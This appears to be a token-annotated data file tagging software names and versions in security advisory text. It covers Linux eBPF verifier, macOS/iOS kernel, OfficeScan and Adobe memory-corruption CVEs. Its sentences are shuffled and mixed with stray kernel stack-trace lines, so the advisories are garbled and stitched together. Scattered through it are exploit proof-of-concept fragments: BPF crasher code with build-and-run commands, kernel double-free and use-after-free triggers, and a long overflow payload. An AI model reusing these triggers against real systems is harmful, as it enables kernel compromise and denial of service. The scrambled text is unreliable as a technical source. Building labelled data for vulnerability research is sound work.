In O
case O
UFO O
packet O
lengths O
exceeds O
MTU O
, O
copy O
= O
maxfraglen O
- O
skb- O
> O
len O
becomes O
negative O
on O
the O
non-UFO O
path O
and O
the O
branch O
to O
allocate O
new O
skb O
is O
taken O
. O

Fraggap O
can O
exceed O
MTU O
, O
causing O
copy O
= O
datalen O
- O
transhdrlen O
- O
fraggap O
to O
become O
negative O
. O

Subsequently O
skb_copy_and_csum_bits O
( O
) O
writes O
out-of-bounds O
. O

A O
similar O
issue O
is O
present O
in O
IPv6 O
code O
. O

However O
in O
between O
two O
send O
( O
) O
calls O
, O
the O
append O
path O
can O
be O
switched O
from O
UFO O
to O
non-UFO O
one O
, O
which O
leads O
to O
a O
memory O
corruption O
. O

This O
triggers O
fragmentation O
and O
computation O
of O
fraggap O
= O
skb_prev- O
> O
len O
- O
maxfraglen O
. O

Linux O
kernel O
: O
Exploitable O
memory O
corruption O
due O
to O
UFO O
to O
non-UFO O
path O
switch O
. O

When O
building O
a O
UFO O
packet O
with O
MSG_MORE O
ip_append_data O
( O
) O
calls O
ip_ufo_append_data O
( O
) O
to O
append O
. O

The O
bug O
was O
introduced O
in O
e89e9cf539a2 O
( O
[ O
IPv4/IPv6 O
] O
: O
UFO O
Scatter-gather O
approach O
) O
on O
Oct O
18 O
2005 O
. O

gtk-vnc SN
0.4.2 SV
and SV
older SV
doesn O
t O
check O
framebuffer O
boundaries O
correctly O
when O
updating O
framebuffer O
which O
may O
lead O
to O
memory O
corruption O
when O
rendering O

check_stack_boundary O
function O
in O
kernel/bpf/verifier.c O
in O
the O
Linux SN
kernel SN
through SV
4.14.8 SV
allows O
local O
users O
to O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
or O
possibly O
have O
unspecified O
other O
impact O
by O
leveraging O
mishandling O
of O
invalid O
variable O
stack O
read O
operations O
. O

entry_SYSCALL_64_fastpath+0x1e/0x86 O
[ O
10599.404040 O
] O

This O
should O
be O
usable O
to O
get O
read+write O
access O
to O
spilled O
stack O
pointers O
. O

iov_iter_init+0x77/0xb0 O
[ O
117.274786 O
] O

vfs_write+0x23e/0x340 O
[ O
10599.404092 O
] O

) O
; O
int O
socks O
; O
if O
( O
socketpair O
( O
AF_UNIX O
, O
SOCK_DGRAM O
, O
0 O
, O
socks O
) O
) O
err O
( O
1 O
, O
socketpair O
) O
; O
if O
( O
setsockopt O
( O
socks O
, O
SOL_SOCKET O
, O
SO_ATTACH_BPF O
, O
& O
progfd O
, O
sizeof O
( O
int O
) O
) O
) O
err O
( O
1 O
, O
setsockopt O
) O
; O
if O
( O
write O
( O
socks O
, O
a O
, O
1 O
) O
! O
= O
1 O
) O
err O
( O
1 O
, O
write O
) O
; O
char O
c O
; O
if O
( O
read O
( O
socks O
, O
& O
c O
, O
1 O
) O
! O
= O
1 O
) O
err O
( O
1 O
, O
read O
res O
) O
; O
return O
0 O
; O
} O
user O
@ O
... O
ian O
: O
~/bpf_range O
$ O
gcc O
-o O
crasher_badtrunc O
crasher_badtrunc.c O
-Wall O
& O
& O
./crasher_badtrunc O
ok O
so O
far O

unix_stream_connect+0x840/0x840 O
[ O
10599.404046 O
] O

Debian O
assigned O
CVE-2017-16995 O
for O
this O
issue O
. O

The O
following O
bugs O
were O
introduced O
in O
4.14 O
: O
fixed O
by O
bpf/verifier O
: O
fix O
bounds O
calculation O
on O
BPF_RSH O
Incorrect O
signed O
bounds O
were O
being O
computed O
for O
BPF_RSH O
. O

sock_alloc_inode+0x46/0x110 O
[ O
117.274731 O
] O

lock_acquire.isra.31+0x2d/0xb40 O
[ O
10599.404059 O
] O

vfs_write+0xe9/0x240 O
[ O
10599.404110 O
] O

wake_up_common_lock+0xaf/0x130 O
[ O
10599.404065 O
] O

sk_filter_trim_cap+0x5c/0x4e0 O
[ O
117.274688 O
] O

bpf_prog_run64+0xc0/0xc0 O
[ O
10599.404017 O
] O

sk_filter_trim_cap+0xf7/0x4e0 O
[ O
10599.404028 O
] O

lockdep_sys_exit+0x16/0x8e O
[ O
117.274827 O
] O

iov_iter_init+0x77/0xb0 O
[ O
10599.404089 O
] O

lock_acquire.isra.31+0x2d/0xb40 O
[ O
117.274746 O
] O

bpf_jit_compile+0x30/0x30 O
[ O
117.274693 O
] O

alloc_skb_with_frags+0x90/0x2c0 O
[ O
117.274697 O
] O

fixed O
by O
bpf O
: O
fix O
32-bit O
ALU O
op O
verification O
adjust_scalar_min_max_vals O
( O
) O
only O
truncates O
its O
inputs O
and O
otherwise O
operates O
on O
64-bit O
numbers O
while O
the O
BPF O
interpreter O
and O
JIT O
perform O
32-bit O
arithmetic O
. O

sock_sendmsg+0x80/0x80 O
[ O
117.274768 O
] O

SyS_read+0x130/0x130 O
[ O
117.274823 O
] O

The O
following O
bug O
was O
introduced O
in O
4.9 SV
: O
fixed O
by O
bpf O
: O
fix O
incorrect O
sign O
extension O
in O
check_alu_op O
( O
) O
check_alu_op O
( O
) O
did O
not O
distinguish O
between O
BPF_ALU64|BPF_MOV|BPF_K O
( O
load O
32-bit O
immediate O
, O
sign-extended O
to O
64-bit O
) O
and O
BPF_ALU|BPF_MOV|BPF_K O
( O
load O
32-bit O
immediate O
, O
zero-padded O
to O
64-bit O
) O
; O
it O
performed O
sign O
extension O
in O
both O
cases O
. O

do_raw_spin_unlock+0x86/0x120 O
[ O
117.274782 O
] O

vfs_write+0xe9/0x240 O
[ O
117.274817 O
] O

unix_dgram_sendmsg+0x3e2/0x960 O
[ O
10599.404033 O
] O

Debian O
assigned O
CVE-2017-16996 O
for O
this O
issue O
. O

alloc_skb_with_frags+0x90/0x2c0 O
[ O
10599.404010 O
] O

sk_filter_trim_cap+0xf7/0x4e0 O
[ O
117.274715 O
] O

fget_light+0x9b/0xb0 O
[ O
10599.404107 O
] O

entry_SYSCALL_64_fastpath+0x1e/0x86 O
[ O
117.274724 O
] O

But O
then O
, O
it O
computes O
the O
new O
arithmetic O
bounds O
as O
the O
intersection O
between O
the O
old O
arithmetic O
bounds O
and O
the O
bounds O
resulting O
from O
the O
bitwise O
tristate O
representation O
. O

One O
of O
the O
bugs O
was O
introduced O
in O
4.9 SV
, O
the O
others O
were O
only O
introduced O
in O
4.14 SV
. O

This O
means O
that O
the O
output O
of O
e.g O
. O

The O
old O
code O
first O
mirrors O
the O
clearing O
of O
the O
high O
32 O
bits O
in O
the O
bitwise O
tristate O
representation O
, O
which O
is O
correct O
. O

entry_SYSCALL_64_fastpath+0x1e/0x86 O
[ O
10599.404036 O
] O

This O
is O
a O
kernel O
pointer O
leak O
. O

fixed O
by O
bpf O
: O
force O
strict O
alignment O
checks O
for O
stack O
pointers O
The O
verifier O
did O
not O
force O
strict O
alignment O
checks O
for O
stack O
pointers O
, O
but O
the O
tracking O
of O
stack O
spills O
relies O
on O
it O
; O
unaligned O
stack O
accesses O
can O
lead O
to O
corruption O
of O
spilled O
registers O
, O
which O
is O
exploitable O
. O

sk_filter_trim_cap+0x5c/0x4e0 O
[ O
10599.404022 O
] O

unix_stream_connect+0x840/0x840 O
[ O
117.274755 O
] O

SyS_read+0x130/0x130 O
[ O
10599.404125 O
] O

entry_SYSCALL_64_fastpath+0x1e/0x86 O
[ O
117.274742 O
] O

sock_create+0x7f/0x2c0 O
[ O
117.274737 O
] O

bpf_jit_compile+0x30/0x30 O
[ O
10599.404006 O
] O

PoC O
for O
bpf O
: O
fix O
incorrect O
sign O
extension O
in O
check_alu_op O
( O
) O
Here O
is O
a O
crasher O
that O
tries O
to O
write O
to O
a O
noncanonical O
address O
. O

If O
the O
old O
upper O
signed O
bound O
was O
positive O
and O
the O
old O
lower O
signed O
bound O
was O
negative O
, O
this O
could O
cause O
the O
new O
upper O
signed O
bound O
to O
be O
too O
low O
, O
leading O
to O
security O
issues O
. O

SyS_write+0xa7/0x130 O
[ O
117.274820 O
] O

fd_install+0x5/0x160 O
[ O
10599.404102 O
] O

SyS_write+0xa7/0x130 O
[ O
10599.404121 O
] O

sock_sendmsg+0x6b/0x80 O
[ O
117.274759 O
] O

A O
few O
BPF O
verifier O
bugs O
in O
the O
Linux O
kernel O
, O
most O
of O
which O
can O
be O
used O
for O
controlled O
memory O
corruption O
, O
have O
been O
fixed O
over O
the O
last O
days O
. O

sock_alloc_inode+0x46/0x110 O
[ O
10599.404043 O
] O

kernel_read+0xa0/0xa0 O
[ O
117.274805 O
] O

sk_filter_trim_cap+0x5c/0x4e0 O
[ O
10599.404000 O
] O

kernel_read+0xa0/0xa0 O
[ O
10599.404098 O
] O

fget_light+0x9b/0xb0 O
[ O
117.274813 O
] O

sock_sendmsg+0x6b/0x80 O
[ O
10599.404071 O
] O

bpf_prog_run32+0x83/0xc0 O
[ O
10599.404013 O
] O

wake_up_common_lock+0xaf/0x130 O
[ O
117.274752 O
] O

unix_dgram_sendmsg+0x3e2/0x960 O
[ O
117.274720 O
] O

sock_create+0x7f/0x2c0 O
[ O
10599.404049 O
] O

sock_write_iter+0x11d/0x1d0 O
[ O
117.274762 O
] O

entry_SYSCALL_64_fastpath+0x1e/0x86 O
[ O
10599.404054 O
] O

) O
; O
int O
socks O
; O
if O
( O
socketpair O
( O
AF_UNIX O
, O
SOCK_DGRAM O
, O
0 O
, O
socks O
) O
) O
err O
( O
1 O
, O
socketpair O
) O
; O
if O
( O
setsockopt O
( O
socks O
, O
SOL_SOCKET O
, O
SO_ATTACH_BPF O
, O
& O
progfd O
, O
sizeof O
( O
int O
) O
) O
) O
err O
( O
1 O
, O
setsockopt O
) O
; O
if O
( O
write O
( O
socks O
, O
a O
, O
1 O
) O
! O
= O
1 O
) O
err O
( O
1 O
, O
write O
) O
; O
char O
c O
; O
if O
( O
read O
( O
socks O
, O
& O
c O
, O
1 O
) O
! O
= O
1 O
) O
err O
( O
1 O
, O
read O
res O
) O
; O
return O
0 O
; O
} O
user O
@ O
... O
ian O
: O
~/bpf_range O
$ O
gcc O
-o O
crasher_badimm O
crasher_badimm.c O
-Wall O
& O
& O
./crasher_badimm O
ok O
so O
far O

unix_stream_connect+0x840/0x840 O
[ O
117.274734 O
] O

bpf_prog_run32+0x83/0xc0 O
[ O
117.274700 O
] O

` O
( O
u32 O
) O
0x40000000 O
( O
u32 O
) O
5` O
will O
be O
incorrect O
. O

sock_write_iter+0x11d/0x1d0 O
[ O
10599.404075 O
] O

lockdep_sys_exit+0x16/0x8e O
[ O
10599.404129 O
] O

entry_SYSCALL_64_fastpath+0x1e/0x86 O
[ O
117.274728 O
] O

sock_sendmsg+0x80/0x80 O
[ O
10599.404080 O
] O

bpf_prog_run64+0xc0/0xc0 O
[ O
117.274705 O
] O

vfs_write+0x23e/0x340 O
[ O
117.274799 O
] O

sk_filter_trim_cap+0x5c/0x4e0 O
[ O
117.274710 O
] O

lockdep_sys_exit_thunk+0x16/0x2b O
[ O
10599.404133 O
] O

fixed O
by O
bpf O
: O
fix O
incorrect O
tracking O
of O
register O
size O
truncation O
The O
BPF O
verifier O
did O
not O
properly O
handle O
register O
truncation O
to O
a O
smaller O
size O
. O

do_raw_spin_unlock+0x86/0x120 O
[ O
10599.404084 O
] O

unix_stream_connect+0x840/0x840 O
[ O
10599.404068 O
] O

fd_install+0x5/0x160 O
[ O
117.274809 O
] O

For O
the O
other O
issues O
, O
examples O
of O
how O
to O
trigger O
them O
are O
in O
the O
added O
BPF O
selftests O
. O

lockdep_sys_exit_thunk+0x16/0x2b O
[ O
117.274831 O
] O

Subject O
: O
Linux SN
> SV
=4.9 SV
: O
eBPF O
memory O
corruption O
bugs O

kernel/bpf/verifier.c O
in O
the O
Linux SN
kernel SN
through SV
4.14.8 SV
allows O
local O
users O
to O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
or O
possibly O
have O
unspecified O
other O
impact O
by O
leveraging O
improper O
use O
of O
pointers O
in O
place O
of O
scalars O
. O

kernel/bpf/verifier.c O
in O
the O
Linux SN
kernel SN
through SV
4.14.8 SV
allows O
local O
users O
to O
cause O
a O
denial O
of O
service O
( O
integer O
overflow O
and O
memory O
corruption O
) O
or O
possibly O
have O
unspecified O
other O
impact O
by O
leveraging O
unrestricted O
integer O
values O
for O
pointer O
arithmetic O
. O

kernel/bpf/verifier.c O
in O
the O
Linux SN
kernel SN
through SV
4.14.8 SV
allows O
local O
users O
to O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
or O
possibly O
have O
unspecified O
other O
impact O
by O
leveraging O
incorrect O
BPF_RSH O
signed O
bounds O
calculations O
. O

kernel/bpf/verifier.c O
in O
the O
Linux SN
kernel SN
through SV
4.14.8 SV
allows O
local O
users O
to O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
or O
possibly O
have O
unspecified O
other O
impact O
by O
leveraging O
mishandling O
of O
32-bit O
ALU O
ops O
. O

ntguard.sys SN
and O
ntguard_x64.sys SN
0.18780.0.0 SV
in O
IKARUS SN
anti.virus SN
2.16.15 SV
have O
a O
Memory O
Corruption O
vulnerability O
via O
a O
0x83000084 O
DeviceIoControl O
request O
. O

check_alu_op O
function O
in O
kernel/bpf/verifier.c O
in O
the O
Linux SN
kernel SN
through SV
4.14.8 SV
allows O
local O
users O
to O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
or O
possibly O
have O
unspecified O
other O
impact O
by O
leveraging O
incorrect O
sign O
extension O
. O

Attackers O
can O
exploit O
the O
vulnerability O
by O
using O
the O
out O
of O
bounds O
access O
for O
unintended O
reads O
, O
writes O
, O
or O
frees O
potentially O
leading O
to O
code O
corruption O
, O
control-flow O
hijack O
, O
or O
information O
leak O
attack O
. O

This O
vulnerability O
is O
an O
instance O
of O
a O
type O
confusion O
vulnerability O
in O
the O
EMF O
processing O
module O
. O

The O
issue O
causes O
the O
program O
to O
access O
an O
object O
using O
an O
incompatible O
type O
, O
leading O
to O
an O
out O
of O
bounds O
memory O
access O
. O

An O
issue O
was O
discovered O
in O
Adobe SN
Acrobat SN
and SN
Reader SN
: O
2017.012.20098 SV
and SV
earlier SV
versions SV
, O
2017.011.30066 SV
and SV
earlier SV
versions SV
, O
2015.006.30355 SV
and SV
earlier SV
versions SV
, O
and SV
11.0.22 SV
and SV
earlier SV
versions SV
. O

The O
mismatch O
between O
an O
old O
and O
a O
new O
object O
can O
provide O
an O
attacker O
with O
unintended O
memory O
access O
potentially O
leading O
to O
code O
corruption O
, O
control-flow O
hijack O
, O
or O
an O
information O
leak O
attack O
. O

This O
vulnerability O
is O
an O
instance O
of O
a O
use O
after O
free O
vulnerability O
in O
the O
JavaScript O
engine O
. O

Successful O
exploitation O
could O
lead O
to O
arbitrary O
code O
execution O
. O

This O
vulnerability O
is O
an O
instance O
of O
a O
use O
after O
free O
vulnerability O
in O
the O
JavaScript O
engine O
API O
. O

This O
vulnerability O
is O
an O
instance O
of O
a O
use O
after O
free O
vulnerability O
in O
the O
JavaScript O
API O
engine O
. O

This O
vulnerability O
is O
an O
instance O
of O
a O
use O
after O
free O
vulnerability O
in O
the O
MakeAccessible O
plugin O
, O
when O
creating O
an O
internal O
data O
structure O
. O

In O
radare SN
2.0.1 SV
, O
a O
memory O
corruption O
vulnerability O
exists O
in O
store_versioninfo_gnu_verdef O
( O
) O
and O
store_versioninfo_gnu_verneed O
( O
) O
in O
libr/bin/format/elf/elf.c O
, O
as O
demonstrated O
by O
an O
invalid O
free O
. O

This O
error O
is O
due O
to O
improper O
sh_size O
validation O
when O
allocating O
memory O
. O

JerryScript SN
1.0 SV
allows O
remote O
attackers O
to O
cause O
a O
denial O
of O
service O
( O
jmem_heap_alloc_block_internal O
heap O
memory O
corruption O
) O
or O
possibly O
execute O
arbitrary O
code O
via O
a O
crafted O
.js O
file O
, O
because O
unrecognized O
characters O
cause O
incorrect O
0x00 O
characters O
in O
bytecode.literal O
data O
. O

Because O
of O
an O
integer O
overflow O
in O
sam2p SN
0.49.3 SV
, O
a O
loop O
executes O
0xffffffff O
times O
, O
ending O
with O
an O
invalid O
read O
of O
size O
1 O
in O
the O
Image O
: O
:Indexed O
: O
:sortPal O
function O
in O
image.cpp O
. O

However O
, O
this O
also O
causes O
memory O
corruption O
because O
of O
an O
attempted O
write O
to O
the O
invalid O
d O
[ O
0xfffffffe O
] O
array O
element O
. O

In O
Poppler SN
0.59.0 SV
, O
memory O
corruption O
occurs O
in O
a O
call O
to O
Object O
: O
:streamGetChar O
in O
Object.h O
after O
a O
repeating O
series O
of O
Gfx O
: O
:display O
, O
Gfx O
: O
:go O
, O
Gfx O
: O
:execOp O
, O
Gfx O
: O
:opShowText O
, O
and O
Gfx O
: O
:doShowText O
calls O
( O
aka O
a O
Gfx.cc O
infinite O
loop O
) O
. O

tpacket_rcv O
function O
in O
net/packet/af_packet.c O
in O
the O
Linux SN
kernel SN
before SV
4.13 SV
mishandles O
vnet O
headers O
, O
which O
might O
allow O
local O
users O
to O
cause O
a O
denial O
of O
service O
( O
buffer O
overflow O
, O
and O
disk O
and O
memory O
corruption O
) O
or O
possibly O
have O
unspecified O
other O
impact O
via O
crafted O
system O
calls O
. O

An O
Unauthorized O
Memory O
Corruption O
vulnerability O
in O
Trend SN
Micro SN
OfficeScan SN
11.0 SV
and SV
XG SV
may O
allow O
remote O
unauthenticated O
users O
who O
can O
access O
the O
OfficeScan O
server O
to O
target O
cgiShowClientAdm.exe O
and O
cause O
memory O
corruption O
issues O
. O

Permission O
is O
explicitly O
given O
for O
insertion O
in O
vulnerability O
databases O
and O
similar O
, O
provided O
that O
due O
credit O
is O
given O
to O
the O
author O
. O

The O
author O
is O
not O
responsible O
for O
any O
misuse O
of O
the O
information O
contained O
herein O
and O
accepts O
no O
responsibility O
for O
any O
damage O
caused O
by O
the O
use O
or O
misuse O
of O
this O
information O
. O

The O
server O
, O
through O
the O
web-based O
management O
console O
, O
makes O
it O
easy O
to O
set O
coordinated O
security O
policies O
and O
deploy O
updates O
to O
every O
agent O
. O

The O
OfficeScan O
agent O
guards O
the O
endpoint O
and O
reports O
its O
security O
status O
to O
the O
server O
. O

Vulnerability O
Type O
: O
Unauthorized O
Remote O
Memory O
Corruption O
CVE O
Reference O
: O
CVE-2017-14089 O
Security O
Issue O
: O
Remote O
unauthenticated O
attackers O
that O
can O
make O
connection O
the O
TrendMicro O
OfficeScan O
XG O
application O
targeting O
the O
cgiShowClientAdm.exe O
process O
can O
cause O
memory O
corruption O
issues O
. O

An O
integrated O
solution O
, O
OfficeScan O
consists O
of O
the O
OfficeScan O
agent O
program O
that O
resides O
at O
the O
endpoint O
and O
a O
server O
program O
that O
manages O
all O
agents O
. O

; O
LogonUser=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA O
; O
ReadOnlyIds=8.56 O
. O

Permission O
is O
hereby O
granted O
for O
the O
redistribution O
of O
this O
advisory O
, O
provided O
that O
it O
is O
not O
altered O
except O
by O
reformatting O
it O
, O
and O
that O
due O
credit O
is O
given O
. O

All O
content O
( O
c O
) O
. O

The O
author O
prohibits O
any O
malicious O
use O
of O
security O
related O
information O
or O
exploits O
by O
the O
author O
or O
elsewhere O
. O

Trend SN
Micro SN
OfficeScan SN
11.0/XG SV
( O
12.0 SV
) O
- O
Memory O
Corruption O

Trend SN
Micro SN
OfficeScan SN
v11.0 SV
and SV
XG SV
( O
12.0 SV
) O
Unauthorized O
Remote O
Memory O
Corruption O
CVE-2017-14089 O
( O
apparitionsec O
hyp3rlinx O
) O

An O
attacker O
must O
first O
obtain O
the O
ability O
to O
execute O
low-privileged O
code O
on O
the O
target O
system O
in O
order O
to O
exploit O
the O
vulnerability O
. O

Memory O
Corruption O
Privilege O
Escalation O
vulnerabilities O
in O
Trend SN
Micro SN
OfficeScan SN
11.0 SV
and SV
XG SV
allows O
local O
attackers O
to O
execute O
arbitrary O
code O
and O
escalate O
privileges O
to O
resources O
normally O
reserved O
for O
the O
kernel O
on O
vulnerable O
installations O
by O
exploiting O
tmwfp.sys O
. O

An O
integer O
overflow O
in O
qla2x00_sysfs_write_optrom_ctl O
function O
in O
drivers/scsi/qla2xxx/qla_attr.c O
in O
the O
Linux SN
kernel SN
through SV
4.12.10 SV
allows O
local O
users O
to O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
and O
system O
crash O
) O
by O
leveraging O
root O
access O
. O

The O
issue O
involves O
the O
Intel O
Graphics O
Driver O
component O
. O

macOS SN
before SV
10.13.2 SV
is O
affected O
. O

An O
issue O
was O
discovered O
in O
certain O
Apple O
products O
. O

It O
allows O
attackers O
to O
execute O
arbitrary O
code O
in O
a O
privileged O
context O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
via O
a O
crafted O
app O
. O

The O
issue O
involves O
the O
WebKit O
component O
. O

iTunes SN
before SV
12.7.2 SV
on O
Windows O
is O
affected O
. O

Safari SN
before SV
11.0.2 SV
is O
affected O
. O

It O
allows O
remote O
attackers O
to O
execute O
arbitrary O
code O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
and O
application O
crash O
) O
via O
a O
crafted O
web O
site O
. O

tvOS SN
before SV
11.2 SV
is O
affected O
. O

iOS SN
before SV
11.2 SV
is O
affected O
. O

iCloud SN
before SV
7.2 SV
on O
Windows O
is O
affected O
. O

watchOS SN
before SV
4.2 SV
is O
affected O
. O

The O
issue O
involves O
the O
Kernel O
component O
. O

soopt_mcopyin O
, O
which O
should O
copyin O
the O
data O
for O
the O
mbuf O
from O
userspace O
, O
has O
the O
following O
code O
: O
error O
= O
copyin O
( O
sopt- O
> O
sopt_val O
, O
mtod O
( O
m O
, O
char O
) O
, O
m- O
> O
m_len O
) O
; O
if O
( O
error O
! O
= O
0 O
) O
{ O
m_freem O
( O
m0 O
) O
; O
return O
( O
error O
) O
; O
} O
This O
means O
that O
if O
the O
copyin O
fails O
, O
by O
for O
example O
providing O
an O
invalid O
userspace O
pointer O
, O
soopt_mcopyin O
will O
free O
the O
mbuf O
. O

This O
PoC O
will O
just O
hit O
a O
panic O
inside O
m_free O
when O
it O
detects O
a O
double-free O
but O
do O
note O
that O
this O
can O
not O
detect O
all O
double O
frees O
and O
this O
issue O
is O
still O
exploitable O
with O
sufficient O
grooming/cache O
manipulation O
. O

The O
relevant O
code O
is O
: O
error O
= O
soopt_getm O
( O
sopt O
, O
& O
token O
) O
; O
if O
( O
error O
) O
{ O
goto O
done O
; O
} O
error O
= O
soopt_mcopyin O
( O
sopt O
, O
token O
) O
; O
if O
( O
error O
) O
{ O
goto O
done O
done O
: O
if O
( O
token O
! O
= O
NULL O
) O
{ O
mbuf_freem O
( O
token O
) O
; O
} O
soopt_getm O
allocates O
an O
mbuf O
. O

mbufs O
are O
aggressivly O
cached O
but O
with O
sufficiently O
full O
caches O
m_freem O
will O
eventually O
fall O
through O
to O
freeing O
back O
to O
a O
zalloc O
zone O
, O
and O
that O
zone O
could O
potentially O
be O
garbage O
collected O
leading O
to O
the O
ability O
to O
actually O
exploit O
such O
an O
issue O
. O

Tested O
on O
MacOS SN
10.13 SV
( O
17A365 SV
) O
on O
MacBook SN
Air5,2 SV
ianbeer O
if O
0 O
MacOS/iOS O
kernel O
double O
free O
due O
to O
incorrect O
API O
usage O
in O
flow O
divert O
socket O
option O
handling O
SO_FLOW_DIVERT_TOKEN O
is O
a O
socket O
option O
on O
the O
SOL_SOCKET O
layer O
. O

Tested O
on O
MacOS SN
10.13 SV
( O
17A365 SV
) O
on O
MacBookAir5,2 O
endif O
include O
< O
stdlib.h O
include O
< O
stdio.h O
include O
< O
sys/socket.h O
int O
main O
( O
) O
{ O
int O
sock O
= O
socket O
( O
PF_INET O
, O
SOCK_DGRAM O
, O
0 O
) O
; O
if O
( O
socket O
< O
0 O
) O
{ O
printf O
( O
failed O
to O
create O
socket O
) O
; O
return O
0 O
; O
} O
printf O
( O
socket O
: O
% O
d O
, O
sock O
) O
; O
setsockopt O
( O
sock O
, O
SOL_SOCKET O
, O
0x1106 O
, O
( O
void O
) O
424242424242 O
, O
100 O
) O
; O
return O
0 O
; O
} O

Apple O
macOS/iOS O
- O
Kernel O
Double O
Free O
due O
to O
Incorrect O
API O
Usage O
in O
Flow O
Divert O
Socket O
Option O
Handling O

The O
issue O
involves O
the O
IOSurface O
component O
. O

If O
a O
MIG O
method O
returns O
an O
error O
code O
, O
then O
it O
took O
ownership O
of O
none O
of O
the O
arguments O
passed O
to O
it O
. O

Proof O
of O
Concept O
: O

IOSurfaceRootUserClient O
external O
method O
17 O
( O
s_set_surface_notify O
) O
will O
drop O
a O
reference O
on O
the O
wake_port O
( O
via O
IOUserClient O
: O
:releaseAsyncReference64 O
) O
then O
return O
an O
error O
code O
if O
the O
client O
has O
previously O
registered O
a O
port O
with O
the O
same O
callback O
function O
. O

Tested O
on O
MacOS SN
10.13 SV
( O
17A365 SV
) O
on O
MacBookAir5,2 O
async_wake O
exploit O
attached O
. O

If O
the O
external O
method O
returns O
an O
error O
then O
MIG O
will O
assume O
that O
the O
reference O
was O
not O
consumed O
by O
the O
external O
method O
and O
as O
such O
the O
MIG O
generated O
coode O
will O
drop O
a O
reference O
on O
the O
port O
. O

If O
an O
IOKit O
userclient O
external O
method O
takes O
an O
async O
wake O
mach O
port O
argument O
then O
the O
lifetime O
of O
the O
reference O
on O
that O
mach O
port O
passed O
to O
the O
external O
method O
will O
be O
managed O
by O
MIG O
semantics O
. O

Gets O
tfp0 O
on O
all O
64-bit O
devices O
plus O
an O
initial O
PoC O
local O
kernel O
debugger O
. O

Tested O
on O
iOS SN
11.0.3 SV
( O
11A432 SV
) O
on O
iPhone SN
6s SV
( O
MKQL2CN/A O
) O

This O
bug O
is O
reachable O
from O
the O
iOS O
app O
sandbox O
as O
demonstrated O
by O
this O
PoC O
. O

See O
the O
README O
and O
kdbg.c O
for O
details O
. O

Apple O
macOS/iOS O
- O
Kernel O
Double O
Free O
due O
to O
IOSurfaceRootUserClient O
not O
Respecting O
MIG O
Ownership O
Rules O

The O
issue O
involves O
the O
IOKit O
component O
. O

IOUserClient O
: O
:clientClose O
is O
not O
a O
destructor O
and O
plays O
no O
role O
in O
the O
lifetime O
management O
of O
an O
IOKit O
object O
. O

Source O
: O
provides O
the O
userspace O
interface O
for O
the O
IOTimeSyncClockManager O
IOService O
. O

Tested O
on O
MacOS SN
10.13 SV
( O
17A365 SV
) O
on O
MacBookAir5,2 O
ianbeer O
build O
: O
clang O
-o O
timesync_uaf O
timesync_uaf.c O
-framework O
IOKit O
-lpthread O
repro O
: O
while O
true O
; O
do O
./timesync_uaf O
; O
done O
if O
0 O
MacOS O
multiple O
kernel O
UAFs O
due O
to O
incorrect O
IOKit O
object O
lifetime O
management O
in O
IOTimeSyncClockManagerUserClient O
IOTimeSyncClockManagerUserClient O
provides O
the O
userspace O
interface O
for O
the O
IOTimeSyncClockManager O
IOService O
. O

For O
an O
exploit O
some O
care O
would O
be O
required O
to O
ensure O
correct O
interleaving O
such O
that O
the O
OSArray O
was O
destroyed O
and O
then O
used O
before O
the O
lock O
which O
is O
supposed O
to O
be O
protecting O
the O
array O
is O
also O
destroyed O
, O
but O
it O
would O
be O
quite O
possible O
. O

IOTimeSyncClockManagerUserClient O
: O
:clientClose O
drops O
references O
on O
a O
bunch O
of O
OSArrays O
causing O
them O
to O
be O
free O
d O
, O
it O
also O
destroys O
the O
locks O
which O
are O
supposed O
to O
protect O
access O
to O
those O
arrays O
. O

This O
leads O
directly O
to O
multiple O
UaFs O
if O
you O
also O
call O
external O
methods O
which O
manipulate O
those O
arrays O
in O
other O
threads O
. O

Tested O
on O
MacOS SN
10.13 SV
( O
17A365 SV
) O
on O
MacBookAir5,2 O
endif O
include O
< O
stdio.h O
include O
< O
stdlib.h O
include O
< O
string.h O
include O
< O
pthread.h O
include O
< O
mach/mach.h O
include O
< O
IOKit/IOKitLib.h O
int O
go O
= O
0 O
; O
void O
thread_func O
( O
void O
arg O
) O
{ O
io_object_t O
conn O
= O
( O
io_object_t O
) O
arg O
; O
go O
= O
1 O
; O
IOServiceClose O
( O
conn O
) O
; O
return O
0 O
; O
} O
int O
main O
( O
int O
argc O
, O
char O
argv O
) O
{ O
kern_return_t O
err O
; O
io_service_t O
service O
= O
IOServiceGetMatchingService O
( O
kIOMasterPortDefault O
, O
IOServiceMatching O
( O
IOTimeSyncClockManager O
) O
) O
; O
if O
( O
service O
IO_OBJECT_NULL O
) O
{ O
printf O
( O
unable O
to O
find O
service O
) O
; O
return O
0 O
; O
} O
io_connect_t O
conn O
= O
MACH_PORT_NULL O
; O
err O
= O
IOServiceOpen O
( O
service O
, O
mach_task_self O
( O
) O
, O
0 O
, O
& O
conn O
) O
; O
if O
( O
err O
! O
= O
KERN_SUCCESS O
) O
{ O
printf O
( O
unable O
to O
get O
user O
client O
connection O
) O
; O
return O
0 O
; O
} O
pthread_t O
thread O
; O
pthread_create O
( O
& O
thread O
, O
NULL O
, O
thread_func O
, O
( O
void O
) O
conn O
) O
; O
while O
( O
! O
go O
) O
{ O
; O
} O
uint64_t O
inputScalar O
[ O
16 O
] O
; O
uint64_t O
inputScalarCnt O
= O
0 O
; O
char O
inputStruct O
[ O
4096 O
] O
; O
size_t O
inputStructCnt O
= O
0 O
; O
uint64_t O
outputScalar O

It O
is O
perfectly O
possible O
to O
call O
: O
:clientClose O
( O
via O
io_service_close O
) O
in O
one O
thread O
and O
call O
an O
external O
method O
in O
another O
thread O
at O
